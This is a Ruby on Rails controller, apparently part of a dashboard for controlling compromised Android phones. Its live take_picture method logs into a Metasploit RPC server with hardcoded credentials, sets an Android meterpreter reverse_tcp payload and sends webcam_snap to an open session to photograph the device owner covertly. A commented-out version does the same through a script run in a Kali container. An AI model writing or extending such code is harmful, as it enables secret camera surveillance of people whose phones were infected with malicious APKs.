class PicturesController < InheritedResources::Base
    # def take_picture
    #     require 'date'
    #     current_time = DateTime.now
    #     fileName= "picture_" + current_time.strftime("%d_%m_%Y_%H_%M") + '.jpeg'
    #     if params[:smartphone_id].present?
    #         puts "yees"
    #         @smartphone = Smartphone.find(params[:smartphone_id])
    #         @apk_installation = ApkInstallation.find(@smartphone.apk_installation_id)
    #         @apk_payload = ApkPayload.find(@apk_installation.apk_payload_id)
        
    #         webcaSnapCommand="docker exec -u 0 kali_container sh -c \"/usr/bin/python /root/webcam_snap.py #{@apk_payload.destination_ip} #{@apk_payload.destination_port} 100 1 #{fileName}\""
    #         copyPictureCommand="docker cp kali_container:/#{fileName} files\\pictures\\#{fileName}"

    #         puts webcaSnapCommand
    #         system(webcaSnapCommand)
    #         system(copyPictureCommand)

    #         message=""
    #         fullPath="files\\pictures\\" + fileName
    #         if File.file?(fullPath)
    #             newPicture=Picture.new(:date => '2003-05-03 00:00:00',:filename => fileName, :smartphone_id => @smartphone.id)
    #             newPicture.save!
    #             message="Picture Taken! Path: " + fullPath
    #         else
    #             message="Could not take picture. Please try again.."
    #         end 
    #         redirect_to controller: 'admin/dashboard', action: 'index', selected_smartphone_id: @smartphone.id
    #     else
    #         puts "noo"
    #     end
    # end


    def take_picture
        require 'msfrpc-client'

        user = 'cool'
        pass = 'looc'

        opts = {
        host: '127.0.0.1',
        port: 3333,
        uri:  '/api/',
        ssl:  true
        }
        rpc = Msf::RPC::Client.new(opts)
        rpc.login(user, pass)

        pay_opts = {
        'PAYLOAD' => 'android/meterpreter/reverse_tcp',
        'LHOST'   => '0.0.0.0',
        'LPORT'   => 4444
        }


        puts rpc.call('session.meterpreter_write', 5, "webcam_snap -p lol2.jpeg -q 100 -i 2")
        puts rpc.call('session.meterpreter_read', 5)
        copyPictureCommand="docker cp kali_container:/lol.png files\\pictures\\lol.png"
        system(copyPictureCommand)

        respond_to do |format|
            format.js
        end


    end




  private

    def picture_params
      params.require(:picture).permit(:date, :duration, :filename, :smartphone_id)
    end

end
